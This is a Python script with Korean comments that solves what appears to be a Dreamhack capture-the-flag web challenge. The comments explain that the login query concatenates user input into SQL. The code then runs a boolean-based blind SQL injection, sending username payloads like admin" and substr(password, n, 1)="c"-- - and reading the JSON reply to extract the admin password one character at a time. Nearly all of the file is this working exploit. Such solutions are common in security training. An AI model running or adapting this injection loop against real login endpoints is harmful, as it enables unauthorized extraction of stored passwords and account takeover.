import requests
import string

# 풀이
# 1. f'SELECT * FROM USERS WHERE username = "{username}" and password = "{password}"' 쿼리문에서 SQL Injection 발생
# 2. 로그인 화면에서 로그인 성공 시 {"error" : "", "result":true} 출력
# 3. 로그인 실패 시 {"error":"check username or password"} 출력
# 4. 2번의 로그를 성공 메시지로 판별해서 username 쪽 항목에 페이로드를 아래와 같이 설정해 1글자씩 플래그 문자 비교
#    => admin" and substr(password, idx (플래그 인덱스 번호), 1)="판별할 문자"
# 5. 추출 완료 시 전체 플래그 출력

URL = "http://host3.dreamhack.games:23002"
URI = "/api/login"
PHPSESSID = 'blbpb5afjvtl49aqso26j0r6ps'

COOKIES = {'PHPSESSID':PHPSESSID}

TRUE_DETECT = """{\"error\":\"\",\"result\":true}"""
FALSE_DETECT = """{\"error\":\"check username or password\"}"""

FLAG = ""

for idx in range(64):
    for elem in string.printable:
        PAYLOAD = f"admin\" and substr(password, {idx + 1}, 1)=\"{elem}\"-- -"
        DATAS = {
            'username' : PAYLOAD,
            'password' : '1'
        }

        resp = requests.post(URL + URI, cookies=COOKIES, data=DATAS)

        if resp.text.replace('\n', '') == TRUE_DETECT:
            FLAG += elem
            print(f"FLAG elem[{idx}] FOUND : {elem}")
            break
        elif elem == string.printable[len(string.printable) - 1]:
            print('NOT FOUND')
            print(f"FOUND FLAG : {FLAG}")
            exit(0)